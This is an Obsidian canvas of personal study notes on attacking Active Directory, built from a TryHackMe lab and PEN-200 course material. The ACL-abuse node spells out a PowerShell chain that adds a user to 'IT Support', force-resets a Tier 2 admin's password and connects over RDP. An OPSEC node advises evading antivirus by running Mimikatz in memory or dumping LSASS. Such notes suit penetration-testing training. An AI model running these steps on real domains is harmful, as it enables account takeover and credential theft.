{
	"nodes":[
		{"id":"cea43664a5a78a4d","type":"text","text":"# Permission Delegation","x":-405,"y":-126,"width":525,"height":106},
		{"id":"6208fc083412c3fe","type":"text","text":"# Exploiting AD","x":-766,"y":-389,"width":306,"height":69},
		{"id":"4e76a54c136a587c","type":"text","text":"- Permission Delegation exploits are often referred to as ACL-based attacks.\n- AD allows administrators to configure **Access Control Entries (ACEs)** that **populates Discretionary Access Control Lists (DACLs)**, hence the name ACL-based attacks.","x":-987,"y":60,"width":1027,"height":100},
		{"id":"880da834f523acf5","type":"text","text":"# Scenario\n![[Pasted image 20240516111946.png]]\n\n1. User `1. WAYNE.GARNER@ZA.TRYHACKME.LOC` is member of group `3. DOMAIN USERS@ZA.TRYHACKME.LOC`\n2. Group `3. DOMAIN USERS@ZA.TRYHACKME.LOC` \n3. Administrator has misconfigured the Permission Delegation of the `5. IT SUPPORT@ZA.TRYHACKME.LOC` by providing the `3. DOMAIN USERS@ZA.TRYHACKME.LOC` group with the `4. Generic Write` \n\t- The members of the group  `3. DOMAIN USERS@ZA.TRYHACKME.LOC` have generic write access to the group `5. IT SUPPORT@ZA.TRYHACKME.LOC`.\n\t- Generic Write access grants the ability to write to any non-protected attribute on the target object, including \"members\" for a group, and \"serviceprincipalnames\" for a user\n\t\t- AddMembers ACE. Any member of the `3. DOMAIN USERS@ZA.TRYHACKME.LOC` group can add accounts to the `5. IT SUPPORT@ZA.TRYHACKME.LOC` Group.\n1. The  `5. IT SUPPORT@ZA.TRYHACKME.LOC` Group has the `6. ForceChangePassword ACE` for the `7. TIER 2 ADMINS@ZA.TRYHACKME.LOC` members.\n\n# Attack\n```powershell\n# logged in as wayne.garner on compromised host\nPS> Add-ADGroupMember \"IT Support\" -Members \"wayne.garner\" # add user to group IT Support\nPS> Get-ADGroupMember -Identity \"IT Support\" # verify if user is added to specified group\n\nPS> Get-ADGroupMember -Identity \"Tier 2 Admins\" # identify members of group to select a target\n\nPS> $Password = ConvertTo-SecureString \"NewPass123\" -AsPlainText -Force # prepare new password\nPS> Set-ADAccountPassword -Identity \"t2_melanie.davies\" -Reset -NewPassword $Password # change password\n# If you get an access denied error, your membership of the IT Support group have not fully replicated through the network yet.\n\nPS> gpupdate /force # force policies update\n```\n```bash\n# KALI - ATTACKER\n$ xfreerdp /u:t2_melanie.davies /p:\"NewPass123\" /v:10.200.47.248 +clipboard /dynamic-resolution # connect to compromised account\n```\n","x":359,"y":851,"width":1441,"height":989},
		{"id":"29af59c7045188e7","type":"text","text":"- **ForceChangePassword:** We have the ability to set the user's current password without knowing their current password.\n- **AddMembers:** We have the ability to add users (including our own account), groups or computers to the target group.\n- **GenericAll:** We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.\n- **GenericWrite:** We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on or **ADD MEMBER TO GROUP**.\n- **WriteOwner:** We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.\n- **WriteDACL:** We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.\n- **AllExtendedRights:** We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.","x":579,"y":360,"width":1000,"height":350},
		{"id":"711ae6d472f30025","type":"text","text":"# Exploiting Access Control Entries (ACEs)\nThe [Bloodhound documentation](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#) assists in explaining enumerated ACEs and how they can be exploited.","x":764,"y":60,"width":631,"height":186},
		{"id":"c9a9ee1bcd60b2ab","type":"text","text":"# Exploiting Kerberos Delegation\nThe practical use of Kerberos Delegation is to enable an application to access resources hosted on a different server.","x":662,"y":-331,"width":733,"height":271},
		{"id":"a052fcf76ac1733a","type":"file","file":"NOTES/99. TOOLS/mimikatz/mimikatz.md","x":1800,"y":-1224,"width":1560,"height":2304},
		{"id":"65121f4968245aef","type":"text","text":"# OPSEC\nDue to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the _Antivirus Evasion_ Module instead. For example, execute Mimikatz directly from memory using an injector like PowerShell,[4](https://portal.offsec.com/courses/PEN-200-44065/learning/attacking-active-directory-authentication-46102/understanding-active-directory-authentication-46171/cached-ad-credentials-46105#fn-local_id_42-4) or use a built-in tool like Task Manager to dump the entire LSASS process memory,[5](https://portal.offsec.com/courses/PEN-200-44065/learning/attacking-active-directory-authentication-46102/understanding-active-directory-authentication-46171/cached-ad-credentials-46105#fn-local_id_42-5) move the dumped data to a helper machine, and then load the data into Mimikatz.[6](https://portal.offsec.com/courses/PEN-200-44065/learning/attacking-active-directory-authentication-46102/understanding-active-directory-authentication-46171/cached-ad-credentials-46105#fn-local_id_42-6)","x":2017,"y":-1640,"width":1127,"height":260},
		{"id":"fa1354e4e524db08","type":"text","text":"# Cached AD Credentials\nhashes are stored in the _Local Security Authority Subsystem Service_ (LSASS)[1](https://portal.offsec.com/courses/PEN-200-44065/learning/attacking-active-directory-authentication-46102/understanding-active-directory-authentication-46171/kerberos-authentication-46103#fn-local_id_42-1) memory space.[](https://portal.offsec.com/courses/PEN-200-44065/learning/attacking-active-directory-authentication-46102/understanding-active-directory-authentication-46171/kerberos-authentication-46103#fn-local_id_42-2)\n\nthe data structures used to store the hashes in memory are not publicly documented, and they are also encrypted with an LSASS-stored key.\n\nLSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target.\n\nAn effective defensive technique to prevent tools such as Mimikatz from extracting hashes is to enable additional LSA Protection. The LSA includes the LSASS process. By setting a registry key, Windows prevents reading memory from this process.","x":800,"y":-940,"width":870,"height":380}
	],
	"edges":[
		{"id":"57c1b51b952b273c","fromNode":"cea43664a5a78a4d","fromSide":"bottom","toNode":"4e76a54c136a587c","toSide":"top"},
		{"id":"11e1ee0759560ac0","fromNode":"6208fc083412c3fe","fromSide":"right","toNode":"cea43664a5a78a4d","toSide":"top"},
		{"id":"6ba4d7ecb446b1a7","fromNode":"cea43664a5a78a4d","fromSide":"right","toNode":"711ae6d472f30025","toSide":"left"},
		{"id":"75f777025f2baa12","fromNode":"711ae6d472f30025","fromSide":"bottom","toNode":"29af59c7045188e7","toSide":"top"},
		{"id":"635aff11e4012c01","fromNode":"29af59c7045188e7","fromSide":"bottom","toNode":"880da834f523acf5","toSide":"top"},
		{"id":"e54a8face7e9bee8","fromNode":"cea43664a5a78a4d","fromSide":"right","toNode":"c9a9ee1bcd60b2ab","toSide":"left"},
		{"id":"83ccec447090ca48","fromNode":"6208fc083412c3fe","fromSide":"top","toNode":"fa1354e4e524db08","toSide":"left"},
		{"id":"451dd67353432876","fromNode":"65121f4968245aef","fromSide":"bottom","toNode":"a052fcf76ac1733a","toSide":"top"},
		{"id":"f25fd82a3dc59d3f","fromNode":"fa1354e4e524db08","fromSide":"right","toNode":"a052fcf76ac1733a","toSide":"left"}
	]
}